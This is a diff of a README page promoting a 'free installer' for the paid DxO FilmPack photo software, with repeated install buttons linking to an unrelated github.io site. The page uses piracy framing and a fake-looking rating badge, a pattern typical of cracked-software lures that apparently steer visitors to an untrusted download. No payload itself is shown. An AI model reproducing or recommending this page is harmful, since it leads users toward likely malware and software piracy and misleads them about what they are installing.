@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Photo+Effect-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Photo+Effects-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 DxO FilmPack Free Installer** — DxO FilmPack is a film emulation plugin and standalone application providing accurate simulations of classic analog films. Works without internet access, no account required. Full offline installation.
+**💻 DxO FilmPack Free Installer** — DxO FilmPack is a digital film emulation application for Windows and macOS that recreates the look of dozens of classic analog film stocks. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install DxO FilmPack](https://img.shields.io/badge/⬇_Install_DxO%20FilmPack-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DxO FilmPack](https://img.shields.io/badge/⬇_Install_DxO+FilmPack-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About DxO FilmPack
 
-DxO FilmPack is a film emulation plugin and standalone application providing accurate simulations of classic analog films. Its proprietary film rendering engine recreates the grain structure, color response, and contrast characteristics of over 80 film stocks.
+DxO FilmPack is a digital film emulation application for Windows and macOS that recreates the look of dozens of classic analog film stocks. Apply authentic film grain, color curves, and tonal characteristics from Kodak, Fujifilm, Ilford, and other classic emulsions to digital photos. Works standalone and as a plugin for Lightroom and Photoshop.
 
 ---
 
 ## ❌ Problem: DxO FilmPack is hard to access
 
-- **Paid License** — Requires purchase; multiple tiers with different film libraries
-- **Film Simulation Only** — Single-purpose tool; requires another editor for full photo workflow
-- **Competition** — Exposure Software and VSCO offer similar film simulation workflows
-- **Niche Audience** — Primarily for photographers passionate about analog film aesthetics
+- **Commercial License** — Significant price for a specialized effects tool
+- **Niche Appeal** — Film emulation primarily of interest to photography enthusiasts
+- **Lightroom Presets** — Many free and paid presets achieve similar results
+- **Use Case** — Specialized tool for stylized photography, not general editing
 
 ---
 
@@ -81,7 +81,7 @@ DxO FilmPack is a film emulation plugin and standalone application providing acc
 
 <div align="center">
 
-[![⬇ Install DxO FilmPack](https://img.shields.io/badge/⬇_Install_DxO%20FilmPack-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DxO FilmPack](https://img.shields.io/badge/⬇_Install_DxO+FilmPack-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ DxO FilmPack is a film emulation plugin and standalone application providing acc
 
 ---
 
-**DxO FilmPack Free Installer** — DxO FilmPack is a film emulation plugin and standalone application providing accurate simulations of classic analog films. Install without internet connection today!
+**DxO FilmPack Free Installer** — DxO FilmPack is a digital film emulation application for Windows and macOS that recreates the look of dozens of classic analog film stocks. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install DxO FilmPack](https://img.shields.io/badge/⬇_Install_DxO%20FilmPack-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DxO FilmPack](https://img.shields.io/badge/⬇_Install_DxO+FilmPack-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
